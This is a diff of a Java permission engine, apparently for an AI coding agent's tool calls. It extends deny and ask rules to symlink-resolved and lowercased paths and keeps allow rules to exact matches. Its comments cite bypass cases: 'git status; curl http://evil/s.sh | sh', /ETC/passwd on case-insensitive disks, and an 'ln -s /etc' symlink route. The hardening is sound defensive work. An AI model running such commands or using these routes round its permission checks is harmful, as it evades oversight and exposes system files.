@@ -8,8 +8,10 @@ import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 import java.util.Objects;
 import java.util.Set;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.CopyOnWriteArrayList;
 
 /**
@@ -59,6 +61,26 @@ import java.util.concurrent.CopyOnWriteArrayList;
  * </ul>
  * 不这么做的后果是实测过的：{@code Bash(git status:*)} 会放行
  * {@code git status; curl http://evil/s.sh | sh}。
+ *
+ * <h2>allow 与目标写法的不对称（与上一节同源、同一个理由）</h2>
+ * 同一个文件 / 同一条命令有多种写法，而放宽匹配在两个方向上的后果完全相反：
+ * <b>deny 放宽只是多拦一些（误拦看得见、能调整），allow 放宽是多放行——放过去就执行了，不可逆</b>。
+ * 故：
+ * <ul>
+ *   <li><b>deny / ask</b>：原写法、{@link PathAliases} 给出的<b>符号链接解析后</b>写法、
+ *       以及二者的<b>小写</b>形态（配一条 pattern 已折成小写的「孪生规则」），
+ *       <b>任一命中即命中</b>；</li>
+ *   <li><b>allow</b>：只认<b>原写法配原规则</b>，一次匹配（{@link #allowMatches}）。</li>
+ * </ul>
+ * 两个漏洞都是实测过的：macOS 的 APFS 大小写不敏感，{@code deny Write(/etc/**)}
+ * 拦不住 {@code /ETC/passwd} 而那是同一个文件；{@code ln -s /etc x && Write x/passwd}
+ * 是符号链接的两步绕过。
+ *
+ * <p><b>折叠孪生不覆盖的两处</b>（原写法那一路仍然照常匹配，故只是没多拦，不是漏了原有能力）：
+ * {@code ~/} 开头的 pattern 由 {@link #fold} 先展开成家目录再折叠——不展开的话
+ * {@link PermissionRule#globMatches} 会把大小写原样的 {@code user.home} 拼到已折小写的
+ * pattern 上，两边对不齐；<b>相对</b> pattern（{@code Read(src/**)}）折叠后仍走
+ * {@code root.relativize}，而折成小写的目标不再 {@code startsWith(root)}，那一路不生效。
  *
  * <h2>可变状态与线程</h2>
  * <ul>
@@ -123,6 +145,14 @@ public final class PermissionEngine {
     private final boolean bypassAllowed;
     private final List<PermissionRule> fileRules = new CopyOnWriteArrayList<>();
     private final List<PermissionRule> sessionRules = new CopyOnWriteArrayList<>();
+    /**
+     * deny/ask 规则 → 它的<b>折叠孪生</b>（pattern 折成小写）。<b>惰性造</b>，见 {@link #foldedTwin}。
+     *
+     * <p>惰性而非在构造器 / {@link #addSessionRule} / {@link #addPersistentRule} 三处分别维护，
+     * 是为了少两个失效点——「加了规则忘了造孪生」的那种漏，恰恰只在 deny 方向上表现为
+     * <b>静默不拦</b>。规则条数有界（配置 + 本会话新增），且 record 的 equals 让同一条规则共用一项。
+     */
+    private final Map<PermissionRule, PermissionRule> foldedTwins = new ConcurrentHashMap<>();
     private volatile PermissionMode mode;
 
     /**
@@ -345,9 +375,12 @@ public final class PermissionEngine {
         // COMMAND 才拆段：deny/ask 逐段命中即命中，allow 逐段全中才放行（见类注释的不对称）
         BashCommandSplitter.Split split =
                 entry.category() == ToolCategory.COMMAND ? BashCommandSplitter.split(target) : null;
+        // 同一个文件的别的写法（符号链接解析后）。整次判定只算一遍——它要碰文件系统，
+        // 而 firstMatch 会为三种 behavior 各遍历一趟规则表。只给 deny/ask，见类注释。
+        List<String> aliases = pathAliases(entry, path, target);
 
         // 1. deny 规则——最高，BYPASS 下也生效
-        PermissionRule deny = firstMatch(PermissionBehavior.DENY, toolName, target, entry, split);
+        PermissionRule deny = firstMatch(PermissionBehavior.DENY, toolName, target, aliases, entry, split);
         if (deny != null) {
             return PermissionDecision.deny("已被 deny 规则 " + deny.toDsl() + " 禁止：" + display(target));
         }
@@ -375,13 +408,14 @@ public final class PermissionEngine {
         // 3. （预留插槽：工具自审 PermissionAware。本期无实现方，期 3 有需要时插在这里）
 
         // 4. ask 规则
-        PermissionRule ask = firstMatch(PermissionBehavior.ASK, toolName, target, entry, split);
+        PermissionRule ask = firstMatch(PermissionBehavior.ASK, toolName, target, aliases, entry, split);
         if (ask != null) {
             return PermissionDecision.askOnly("命中 ask 规则 " + ask.toDsl() + "，每次都需要你确认：" + display(target));
         }
 
         // 5. allow 规则
-        PermissionRule allow = firstMatch(PermissionBehavior.ALLOW, toolName, target, entry, split);
+        // allow 刻意不传 aliases：它只认原写法（这个参数在这里缺席本身就是那道不对称）
+        PermissionRule allow = firstMatch(PermissionBehavior.ALLOW, toolName, target, List.of(), entry, split);
         if (allow != null) {
             return PermissionDecision.allow("命中 allow 规则 " + allow.toDsl());
         }
@@ -400,14 +434,17 @@ public final class PermissionEngine {
     /**
      * 找第一条命中的规则；会话规则优先于落盘规则（「本会话不再问」应当立刻管用）。
      *
-     * <p>COMMAND 的匹配方向<b>故意不对称</b>，见类注释：deny/ask 任一段命中即命中，
-     * allow 每段都命中才算。
+     * <p>匹配方向<b>故意不对称</b>，见类注释的两节：deny/ask 任一段 / 任一写法命中即命中，
+     * allow 每段都命中才算、且只认原写法。
+     *
+     * @param aliases 目标的其他写法（符号链接解析后）；<b>allow 一律传空表</b>
      */
     private PermissionRule firstMatch(PermissionBehavior behavior, String toolName,
-                                      String target, ToolRegistry.Entry entry,
+                                      String target, List<String> aliases, ToolRegistry.Entry entry,
                                       BashCommandSplitter.Split split) {
         for (PermissionRule r : allRules()) {
-            if (r.behavior() == behavior && ruleMatches(r, behavior, toolName, target, entry, split)) {
+            if (r.behavior() == behavior
+                    && ruleMatches(r, behavior, toolName, target, aliases, entry, split)) {
                 return r;
             }
         }
@@ -415,18 +452,150 @@ public final class PermissionEngine {
     }
 
     private boolean ruleMatches(PermissionRule rule, PermissionBehavior behavior, String toolName,
-                                String target, ToolRegistry.Entry entry,
+                                String target, List<String> aliases, ToolRegistry.Entry entry,
                                 BashCommandSplitter.Split split) {
-        // 未登记工具的判定目标是整串入参，可能就是一条命令（shell 类 MCP 工具），
-        // 故与 COMMAND 一样保留 hasShellSeparator 那道守卫；url / query / bash_id 则不需要，
-        // 否则一条 WebFetch(https://x/:*) 会被 URL 里的 & 打成不命中（查询串里的 & 不是 shell 分隔符）
-        boolean separatorSensitive = entry.category() == ToolCategory.COMMAND
-                || entry.category() == ToolCategory.UNKNOWN;
-        if (entry.category() != ToolCategory.COMMAND || split == null) {
-            return rule.matches(toolName, target, entry.pathTarget(), root, separatorSensitive);
-        }
         if (behavior == PermissionBehavior.ALLOW) {
-            return allowMatchesEverySegment(rule, toolName, target, split);
+            return allowMatches(rule, toolName, target, entry, split);
+        }
+        return denyOrAskMatches(rule, toolName, target, aliases, entry, split);
+    }
+
+    /**
+     * deny / ask 方向的匹配：把目标扩成一组<b>候选写法</b>，任一命中即命中。
+     *
+     * <p>顺序是「先精确后放宽」——原写法 → 别名 → 各自的小写形态（配折叠孪生）。
+     * 命中哪一条不影响结论（都是同一条规则），但先跑最常见的那一路能省掉大部分折叠开销。
+     */
+    private boolean denyOrAskMatches(PermissionRule rule, String toolName, String target,
+                                     List<String> aliases, ToolRegistry.Entry entry,
+                                     BashCommandSplitter.Split split) {
+        if (matchesOneTarget(rule, toolName, target, entry, split)) {
+            return true;
+        }
+        for (String alias : aliases) {
+            if (matchesOneTarget(rule, toolName, alias, entry, splitOf(entry, alias))) {
+                return true;
+            }
+        }
+        PermissionRule twin = foldedTwin(rule);
+        if (twin == null) {
+            return false;                       // 裸工具名规则 / allow：不折叠
+        }
+        if (matchesFolded(twin, toolName, target, entry)) {
+            return true;
+        }
+        for (String alias : aliases) {
+            if (matchesFolded(twin, toolName, alias, entry)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    /**
+     * 折叠孪生配<b>折成小写的目标</b>。两边都折才对得上——只折一边只能盖住另一边写对了大小写的情形，
+     * 而 {@code deny Write(/ETC/**)} 对 {@code /etc/passwd} 与反过来同样都要拦。
+     */
+    private boolean matchesFolded(PermissionRule twin, String toolName, String candidate,
+                                  ToolRegistry.Entry entry) {
+        if (candidate == null) {
+            return false;
+        }
+        String lower = candidate.toLowerCase(Locale.ROOT);
+        return matchesOneTarget(twin, toolName, lower, entry, splitOf(entry, lower));
+    }
+
+    /**
+     * 某条规则的折叠孪生（pattern 折成小写）；<b>不该折叠时返回 null</b>。
+     *
+     * <p>两道守卫，方向都只有一个——不让 allow 变宽：
+     * <ul>
+     *   <li><b>{@code pattern == null}</b>（裸工具名 / {@code 工具名(*)}）：与大小写无关，
+     *       且 {@code toLowerCase} 会 NPE；</li>
+     *   <li><b>{@code ALLOW}</b>：<b>本任务的安全支点</b>。折叠是「多命中一些」，
+     *       在 deny/ask 上是多拦、在 allow 上是多放行——后者不可逆。</li>
+     * </ul>
+     */
+    private PermissionRule foldedTwin(PermissionRule rule) {
+        if (rule.pattern() == null || rule.behavior() == PermissionBehavior.ALLOW) {
+            return null;
+        }
+        return foldedTwins.computeIfAbsent(rule, PermissionEngine::fold);
+    }
+
+    /**
+     * 造孪生：{@code ~/} 先展开再折小写。
+     *
+     * <p>不展开就折的话，{@link PermissionRule#globMatches} 会把<b>大小写原样</b>的
+     * {@code user.home} 拼到已折小写的 pattern 上（{@code /Users/zxh/.ssh/**}），
+     * 而目标那边整串折成了小写（{@code /users/zxh/.ssh/id_rsa}），两边永远对不齐——
+     * 一条 {@code deny Read(~/.ssh/**)} 就白折了。
+     */
+    private static PermissionRule fold(PermissionRule rule) {
+        String pattern = rule.pattern();
+        String home = System.getProperty("user.home");
+        if (pattern.startsWith("~/") && home != null && !home.isBlank()) {
+            pattern = home + pattern.substring(1);
+        }
+        return new PermissionRule(rule.toolName(), pattern.toLowerCase(Locale.ROOT),
+                rule.behavior(), rule.scope());
+    }
+
+    /**
+     * 换了写法就得重新拆段——{@link #matchesOneTarget} 的 split 必须是该写法自己的。
+     * 非 COMMAND 一律 null（与 {@link #doDecide} 里的原始 split 同一个约定）。
+     */
+    private static BashCommandSplitter.Split splitOf(ToolRegistry.Entry entry, String target) {
+        return entry.category() == ToolCategory.COMMAND ? BashCommandSplitter.split(target) : null;
+    }
+
+    /**
+     * 目标的<b>其他</b>写法（符号链接解析后），原写法不重复列入；<b>只对路径目标有意义</b>。
+     *
+     * <p>命令 / URL / {@code bash_id} 没有「符号链接解析后」这一说（折大小写才是它们那一路，
+     * 由 {@link #matchesFolded} 负责）——把 {@link PathAliases} 套到一条命令串上只会
+     * 得到一个把整条命令当路径解析的垃圾结果。
+     */
+    private static List<String> pathAliases(ToolRegistry.Entry entry, Path path, String target) {
+        if (!entry.pathTarget() || path == null) {
+            return List.of();
+        }
+        List<String> out = new ArrayList<>(1);
+        for (Path alias : PathAliases.of(path)) {
+            String s = alias.toString();
+            if (!s.equals(target)) {
+                out.add(s);
+            }
+        }
+        return out;
+    }
+
+    /**
+     * allow 方向的匹配：<b>一次、原写法、原规则</b>。
+     *
+     * <p>与 {@link #matchesOneTarget} 的差别只在命令分段的方向（每段都中 vs 任一段中）；
+     * 「不用别名、不折大小写」这一半的不对称在 {@link #denyOrAskMatches} 那侧——
+     * 本方法只要保持「不知道有那回事」即可。两处不对称同一个理由，见类注释。
+     */
+    private boolean allowMatches(PermissionRule rule, String toolName, String target,
+                                 ToolRegistry.Entry entry, BashCommandSplitter.Split split) {
+        if (entry.category() != ToolCategory.COMMAND || split == null) {
+            return rule.matches(toolName, target, entry.pathTarget(), root, separatorSensitive(entry));
+        }
+        return allowMatchesEverySegment(rule, toolName, target, split);
+    }
+
+    /**
+     * 拿<b>一种</b>写法、<b>一条</b>规则做一次匹配（deny/ask 方向的原子操作）：
+     * 整串命中，或——命令的话——任一段命中。
+     *
+     * @param split 必须是 {@code target} <b>自己</b>的拆分结果；换了写法就得重新拆
+     *              （见 {@link #splitOf}），拿原写法的段去配另一种写法会串。
+     */
+    private boolean matchesOneTarget(PermissionRule rule, String toolName, String target,
+                                     ToolRegistry.Entry entry, BashCommandSplitter.Split split) {
+        if (entry.category() != ToolCategory.COMMAND || split == null) {
+            return rule.matches(toolName, target, entry.pathTarget(), root, separatorSensitive(entry));
         }
         // deny / ask：整串命中，或任一段命中
         if (rule.matches(toolName, target, false, root, true)) {
@@ -438,6 +607,19 @@ public final class PermissionEngine {
             }
         }
         return false;
+    }
+
+    /**
+     * 目标有没有可能是一条 shell 命令（{@link PermissionRule#hasShellSeparator} 那道守卫开不开）。
+     *
+     * <p>未登记工具的判定目标是整串入参，可能就是一条命令（shell 类 MCP 工具），
+     * 故与 COMMAND 一样保留守卫；url / query / bash_id 则不需要，
+     * 否则一条 {@code WebFetch(https://x/:*)} 会被 URL 里的 {@code &} 打成不命中
+     * （查询串里的 {@code &} 不是 shell 分隔符）。
+     */
+    private static boolean separatorSensitive(ToolRegistry.Entry entry) {
+        return entry.category() == ToolCategory.COMMAND
+                || entry.category() == ToolCategory.UNKNOWN;
     }
 
     /**
